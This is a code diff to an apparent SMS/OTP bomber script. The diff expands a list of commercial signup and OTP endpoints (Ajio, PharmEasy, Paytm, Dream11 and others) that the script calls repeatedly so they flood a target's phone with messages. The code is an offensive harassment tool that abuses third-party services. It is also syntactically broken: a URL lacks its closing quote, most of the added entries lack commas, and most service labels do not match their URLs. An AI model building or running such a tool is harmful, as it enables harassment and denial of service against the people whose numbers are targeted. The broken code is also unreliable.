@@ -34,14 +34,26 @@ def send_bomber(mobile):
         # Note: 'm' is the method, 'u' is url, 'd' is data/payload, 't' is type (json or data)
         apis = [
             {"name": "JustDial", "m": "GET", "u": f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={mobile}"},
-            {"name": "ConfirmTkt", "m": "POST", "u": "https://securedapi.confirmtkt.com/api/platform/register", "d": {"mobileNumber": mobile}, "t": "json"},
-            {"name": "Housing", "m": "POST", "u": "https://login.housing.com/api/v2/send-otp", "d": {"phone": mobile}, "t": "json"},
-            {"name": "Ajio", "m": "POST", "u": "https://login.web.ajio.com/api/auth/signupSendOTP", "d": {"mobileNumber": mobile}, "t": "json"},
-            {"name": "PharmEasy", "m": "POST", "u": "https://pharmeasy.in/api/auth/requestOTP", "d": {"contactNumber": mobile}, "t": "json"},
-            {"name": "Treebo", "m": "POST", "u": "https://www.treebo.com/api/v2/auth/login/otp/", "d": {"phone_number": mobile}, "t": "json"},
-            {"name": "Dream11", "m": "POST", "u": "https://api.dream11.com/sendsmslink", "d": {"mobileNum": mobile}, "t": "json"},
-            {"name": "Porter", "m": "POST", "u": "https://porter.in/restservice/send_app_link_sms", "d": {"phone": mobile}, "t": "json"}
-        ]
+            {"name": "ConfirmTkt", "m": "POST", "u": "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber=", "d": {"mobileNumber": mobile}, "t": "json"},
+            {"name": "Housing", "m": "POST", "u": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", "d": {"phone": mobile}, "t": "json"},
+            {"name": "Ajio", "m": "POST", "u": "https://www.frotels.com/appsendsms.php", "d": {"mobileNumber": mobile}, "t": "json"},
+            {"name": "PharmEasy", "m": "POST", "u": "https://www.gapoon.com/userSignup, "d": {"contactNumber": mobile}, "t": "json"},
+            {"name": "Treebo", "m": "POST", "u": "https://login.housing.com/api/v2/send-otp", "d": {"phone_number": mobile}, "t": "json"},
+            {"name": "Dream11", "m": "POST", "u": "https://porter.in/restservice/send_app_link_sms", "d": {"mobileNum": mobile}, "t": "json"},
+            {"name": "Porter", "m": "POST", "u": "https://cityflo.com/website-app-download-link-sms/", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://api.nnnow.com/d/api/appDownloadLink", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://login.web.ajio.com/api/auth/signupSendOTP", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://unacademy.com/api/v1/user/get_app_link/", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://www.treebo.com/api/v2/auth/login/otp/", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn=", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://pharmeasy.in/api/auth/requestOTP", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://www.mylescars.com/usermanagements/chkContact", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://grofers.com/v2/accounts/", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://api.dream11.com/sendsmslink", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://www.cashify.in/api/cu01/v1/app-link?mn=", "d": {"phone": mobile}, "t": "json"}
+            {"name": "Porter", "m": "POST", "u": "https://commonfront.paytm.com/v4/api/sendsms", "d": {"phone": mobile}, "t": "json"}
+          ]
 
         for api in apis:
             if not active_tasks.get(mobile): break # Stop immediately if requested
